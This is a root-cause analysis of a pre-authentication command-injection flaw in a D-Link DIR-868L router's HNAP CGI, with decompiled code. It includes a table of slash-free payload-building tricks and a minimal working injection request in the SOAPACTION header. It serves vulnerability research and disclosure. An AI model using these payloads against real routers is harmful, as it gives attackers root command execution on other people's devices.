# Root-Cause Analysis — HNAP `SOAPACTION` Pre-auth Command Injection

Binary: `/htdocs/cgibin` (ARM EABI5, non-PIE base `0x8000`, uClibc 0.9.32.1)
MD5 `64a37f67c57dc25b3678dbcc8554c10e` — DIR-868L B1 fw v2.01b05.

The binary is a multi-call CGI: `main` dispatches on the basename of
`argv[0]`. `hnap` (symlinked as `/usr/sbin/hnap`, aliased as `/HNAP1` by the
web server config generated in `etc/services/HTTP/httpcfg.php`) reaches the
HNAP dispatcher `sub_1A57C`.

## 1. The authentication gate is a substring match

`sub_1A57C` reads `HTTP_SOAPACTION` (header `SOAPACTION`) and decides
authentication like this (decompiled, addresses from the binary):

```c
haystack = getenv("HTTP_SOAPACTION");
if (haystack) {
    if (!strstr(haystack, "http://purenetworks.com/HNAP1/GetDeviceSettings")) {
        if (strstr(haystack, ".../HNAP1/Login"))      { /* login flow */ }
        if (v14 && sub_19BB8(cookie, v14, haystack) < 0) { /* 301 */ }
        if (!v14)                                      { /* reject */ }
        if (strstr(haystack, ".../HNAP1/Logout"))      { /* logout */ }
    }
}
```

Every authentication primitive — the `HNAP_AUTH` HMAC verification
(`sub_19BB8`), the header-presence check, cookie validation — lives **inside
the `if (!strstr(...))` block**. `GetDeviceSettings` legitimately skips it
(setup wizard), but `strstr()` is unanchored: the string merely has to
*appear* in the header. Appending `/; payload ;` to the whitelisted URL
keeps the substring present while replacing the effective action.

## 2. The action name flows unfiltered into system()

```c
haystack = strrchr(haystack, '/') + 1;            /* text after LAST '/'   */
if (haystack[strlen(haystack)-1] == '"')          /* strip trailing quote  */
    haystack[strlen(haystack)-1] = 0;
...
sprintf(s, "%s%s.php\nShellPath=%s%s.sh\nPrivateKey=%s\n",
        "/etc/templates/hnap/", haystack, "/var/run/", haystack, byte_368C0);
...                                                /* phpcgi template run  */
strcpy(s, haystack);                              /* unbounded copy #1    */
sprintf(s, "sh %s%s.sh > /dev/console",           /* 0x1AA34              */
        "/var/run/", haystack);
system(s);                                        /* 0x1AA40 — sink       */
```

Notes:

* The same `strcpy(s, haystack)` into `char s[256]` (`r11-0x12C`) is a
  second, independent overflow sink for a long action name (bounded here
  only by the web server's header-length limit).
* `system()` runs `sh -c "sh /var/run/<action>.sh > /dev/console"` — the
  `> /dev/console` redirect binds only to the trailing `.sh` fragment, so
  **injected command segments inherit the CGI's stdout** and their output is
  relayed to the HTTP client when preceded by a CGI header line.
* The web server spawns CGIs as root.

## 3. Exploitation constraints (all measured on FirmAE full-system emulation)

| Constraint | Cause | Consequence |
|---|---|---|
| payload must follow the header's last `/` | `strrchr(SOAPACTION, '/')+1` | payload itself must be **slash-free**; build `/` at runtime: `s=`echo $PATH \| busybox cut -c1`` then `cat ${s}proc${s}self${s}status` |
| `(` rejected | web-server header value parsing (connection reset / 500) | no `$()`; backticks work |
| applet set | this busybox build: no `id`, broken `printf`; has `echo`, `cut`, `tr`, `cat`, `ls`, `uname`, `wget` … | use `cut`/`tr` for character construction |
| output relay needs CGI headers | httpd CGI protocol | prefix `echo Content-Type: text/plain; echo;` |
| `${s}` concatenation | shell word splitting | `cat ${s}path` needs the space; `cat${s}path` becomes one word |

## 4. Why the trailing `.sh` does not matter

`sh -c` parses `sh /var/run/; <payload>; .sh > /dev/console` as three
command segments; only the last carries the redirect. `<payload>` executes
foreground with inherited fds — hence the output channel.

## 5. Minimal request

```http
GET /HNAP1/ HTTP/1.1
Host: <target>
SOAPACTION: "http://purenetworks.com/HNAP1/GetDeviceSettings/; sleep 10;"
```

Server-side wall time ≈ 10 s. Unknown non-spoofed action (`.../HNAP1/ZZZ`)
returns `401 Not Authorized`, demonstrating the gate is otherwise enforced.
